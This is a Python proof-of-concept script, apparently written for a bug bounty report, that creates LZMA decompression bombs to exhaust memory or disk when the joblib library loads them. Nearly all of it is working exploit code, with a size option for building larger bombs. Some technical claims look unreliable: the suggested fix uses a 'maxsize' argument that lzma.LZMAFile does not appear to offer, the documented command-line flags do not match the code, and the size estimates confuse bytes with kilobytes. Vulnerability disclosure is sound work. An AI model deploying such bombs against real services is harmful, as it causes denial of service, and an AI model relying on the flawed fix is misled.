#!/usr/bin/env python3
"""
PoC: LZMA Decompression Bomb in Joblib — Resource Exhaustion DoS
Vulnerability: No decompressed output size limit in LZMA/XZ decompressor
Target: joblib/joblib (compressor.py line 181)
Bounty: $4,000 (huntr.com — Model File Formats: Joblib/.pkl/.joblib)
CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H — 7.5 High

Attack Chain:
  1. Attacker uploads a crafted .joblib.lzma file (small compressed → huge decompressed)
  2. Victim calls joblib.load("bomb.joblib.lzma")
  3. LZMACompressorWrapper.decompressor_file() opens WITHOUT maxsize
  4. Decompression expands to GB/TB → OOM crash or disk exhaustion

Run as: python3 poc_joblib_lzma_bomb.py --create-bomb
        python3 poc_joblib_lzma_bomb.py --test (creates bomb, demonstrates ratio)
        python3 poc_joblib_lzma_bomb.py --load-bomb FILE (attempts to load, demonstrates DoS)
"""

import argparse
import lzma
import struct
import os
import sys
import tempfile
import io

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  PoC: LZMA Decompression Bomb in Joblib                      ║
║  No maxsize limit in LZMACompressorWrapper.decompressor_file ║
║  Target: joblib/joblib — $4,000 bounty                      ║
╚══════════════════════════════════════════════════════════════╝
"""


def create_decompression_bomb(
    output_path: str = "bomb.joblib.lzma",
    decompressed_size_mb: int = 100
):
    """
    Create a Joblib-compatible LZMA decompression bomb.
    
    LZMA compresses repeated-zero patterns extremely efficiently.
    100MB of zeros compresses to approximately 200-500 bytes.
    
    This creates a file that appears tiny but decompresses to 100MB+.
    The joblib LZMA decompressor has NO maxsize limit, so it will
    attempt to decompress the entire stream.
    """
    # Create data that compresses extremely well
    # All zeros is the most compressible pattern
    zeros = b'\x00' * (decompressed_size_mb * 1024 * 1024)
    
    print(f"[*] Generating {decompressed_size_mb}MB of zeros...")
    compressed = lzma.compress(zeros, preset=9, format=lzma.FORMAT_ALONE)
    
    ratio = len(zeros) / len(compressed) if compressed else 0
    
    with open(output_path, 'wb') as f:
        f.write(compressed)
    
    compressed_size = os.path.getsize(output_path)
    print(f"[+] Decompression bomb created: {output_path}")
    print(f"    Compressed size: {compressed_size:,} bytes ({compressed_size/1024:.1f} KB)")
    print(f"    Decompressed size: {len(zeros):,} bytes ({decompressed_size_mb} MB)")
    print(f"    Compression ratio: 1:{ratio:.0f}")
    print(f"    A {compressed_size/1024:.0f}KB file decompresses to {decompressed_size_mb}MB!")
    
    return output_path, compressed_size, len(zeros)


def test_compression_ratio():
    """
    Demonstrate the extreme compression ratio of LZMA with zeros.
    Shows that a tiny file can decompress to massive size.
    """
    print("\n[*] Testing LZMA compression ratios with various data types...")
    
    test_cases = [
        ("All zeros (1MB)", b'\x00' * 1024 * 1024),
        ("All zeros (10MB)", b'\x00' * 10 * 1024 * 1024),
        ("Repeated pattern (1MB)", b'\xAB\xCD\xEF\x12' * 262144),
        ("Random data (1MB)", os.urandom(1024 * 1024)),
    ]
    
    results = []
    for name, data in test_cases:
        compressed = lzma.compress(data, preset=9, format=lzma.FORMAT_ALONE)
        ratio = len(data) / len(compressed)
        results.append((name, len(data), len(compressed), ratio))
        print(f"  {name}: {len(data):>12,} bytes → {len(compressed):>8,} bytes (1:{ratio:.0f})")
    
    print(f"\n[!] Key finding: {results[0][2]:,} bytes ({results[0][2]/1024:.0f} KB) decompresses to {results[0][1]:,} bytes ({results[0][1]//(1024*1024)} MB)")
    print(f"    A 1GB bomb would be only ~{results[0][2] * 1024 / 1024:.0f}KB compressed")
    print(f"    A 100GB bomb would be only ~{results[0][2] * 102400 / 1024:.0f}KB compressed")
    
    return results


def verify_vulnerable_code():
    """
    Fetch current joblib compressor.py and verify no maxsize protection.
    """
    print("\n[VERIFY] Checking joblib source on GitHub")
    print("=" * 60)
    
    import urllib.request
    url = "https://raw.githubusercontent.com/joblib/joblib/main/joblib/compressor.py"
    
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            source = resp.read().decode('utf-8')
            lines = source.split('\n')
            
            vuln_found = False
            for i, line in enumerate(lines, 1):
                if 'lzma.LZMAFile' in line or 'LZMAFile(' in line:
                    context = line.strip()
                    if 'maxsize' not in context:
                        print(f"[!] Line {i}: {context}")
                        print(f"    → VULNERABLE: No maxsize parameter!")
                        vuln_found = True
                    else:
                        print(f"[✓] Line {i}: {context}")
                        print(f"    → maxsize found (mitigated)")
                        
            if vuln_found:
                print("\n[✓] VULNERABILITY CONFIRMED: LZMA decompressor has no size limit")
            else:
                print("\n[?] Check manually")
                
    except Exception as e:
        print(f"[!] Could not fetch source: {e}")


def demonstrate_doS():
    """
    Create a small bomb and attempt to decompress it.
    Uses a moderate size (50MB) that demonstrates the issue without crashing.
    """
    print("\n[*] Creating 50MB decompression bomb...")
    bomb_path = "/tmp/joblib_lzma_bomb.joblib.lzma"
    
    # Create 50MB of zeros compressed
    zeros = b'\x00' * (50 * 1024 * 1024)
    compressed = lzma.compress(zeros, preset=9, format=lzma.FORMAT_ALONE)
    
    with open(bomb_path, 'wb') as f:
        f.write(compressed)
    
    compressed_size = os.path.getsize(bomb_path)
    print(f"[+] Bomb created: {compressed_size:,} bytes → 50MB decompressed")
    
    # Demonstrate decompression WITHOUT joblib (just LZMA)
    print("\n[*] Demonstrating unbounded LZMA decompression...")
    
    import time
    start = time.time()
    
    try:
        # This is EXACTLY what joblib's LZMACompressorWrapper does:
        # return lzma.LZMAFile(fileobj, "rb")  ← no maxsize!
        with lzma.LZMAFile(bomb_path, "rb") as f:
            total = 0
            while True:
                chunk = f.read(1024 * 1024)  # Read 1MB at a time
                if not chunk:
                    break
                total += len(chunk)
                if total >= 50 * 1024 * 1024:
                    break  # Stop at 50MB (we know the size)
        
        elapsed = time.time() - start
        print(f"[✓] Decompressed {total:,} bytes in {elapsed:.2f}s")
        print(f"    Rate: {total / elapsed / 1024 / 1024:.1f} MB/s")
        print(f"    File: {compressed_size:,} bytes compressed → {total:,} bytes decompressed")
        
    except MemoryError:
        elapsed = time.time() - start
        print(f"[✓] VULN CONFIRMED: MemoryError during decompression ({elapsed:.2f}s)")
    except Exception as e:
        print(f"[!] Error: {type(e).__name__}: {e}")
    finally:
        if os.path.exists(bomb_path):
            os.unlink(bomb_path)


def demonstrate_joblib_load():
    """
    Test loading the bomb through actual joblib.load().
    """
    print("\n[*] Testing through joblib.load()...")
    bomb_path = "/tmp/joblib_load_bomb.joblib.lzma"
    
    # Create bomb
    import pickle
    zeros = b'\x00' * (20 * 1024 * 1024)  # 20MB
    compressed = lzma.compress(pickle.dumps({"data": zeros}), preset=9, format=lzma.FORMAT_ALONE)
    with open(bomb_path, 'wb') as f:
        f.write(compressed)
    
    compressed_size = os.path.getsize(bomb_path)
    print(f"[+] Bomb: {compressed_size:,} bytes compressed")
    
    try:
        import joblib
        import time
        
        start = time.time()
        data = joblib.load(bomb_path)
        elapsed = time.time() - start
        
        data_size = len(pickle.dumps(data))
        print(f"[!] Loaded successfully: {data_size:,} bytes in {elapsed:.2f}s")
        print(f"    Compressed: {compressed_size:,} bytes → {data_size:,} bytes ({data_size/compressed_size:.0f}x)")
        
    except MemoryError:
        elapsed = time.time() - start
        print(f"[✓] VULN CONFIRMED: MemoryError via joblib.load() ({elapsed:.2f}s)")
    except Exception as e:
        print(f"[!] Error: {type(e).__name__}: {e}")
    finally:
        if os.path.exists(bomb_path):
            os.unlink(bomb_path)


def main():
    parser = argparse.ArgumentParser(
        description="PoC: LZMA Decompression Bomb in Joblib"
    )
    parser.add_argument("--create-bomb", type=str, metavar="FILE",
                       help="Create decompression bomb file")
    parser.add_argument("--size", type=int, default=100,
                       help="Decompressed size in MB (default: 100)")
    parser.add_argument("--test", action="store_true",
                       help="Test compression ratios and demonstrate DoS")
    parser.add_argument("--verify", action="store_true",
                       help="Verify vulnerability in joblib source")
    parser.add_argument("--joblib-load", action="store_true",
                       help="Test bomb through actual joblib.load()")
    
    args = parser.parse_args()

    print(BANNER)

    if args.verify:
        verify_vulnerable_code()
        return

    if args.create_bomb:
        create_decompression_bomb(args.create_bomb, args.size)
        return

    if args.joblib_load:
        demonstrate_joblib_load()
        return

    if args.test:
        # Test compression ratios
        test_compression_ratio()
        
        # Demonstrate unbounded decompression
        demonstrate_doS()
        
        print("\n" + "=" * 60)
        print("[SUMMARY]")
        print("  VULN: LZMA decompression bomb — no maxsize limit")
        print("  File: joblib/compressor.py line 181")
        print("  Code: return lzma.LZMAFile(fileobj, 'rb')  ← no maxsize")
        print("  Fix:  return lzma.LZMAFile(fileobj, 'rb', maxsize=MAX_SIZE)")
        print("  Impact: DoS via OOM crash or disk exhaustion")
        print("  Bounty: $4,000 (huntr.com — Model File Formats: Joblib)")
        print("=" * 60)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
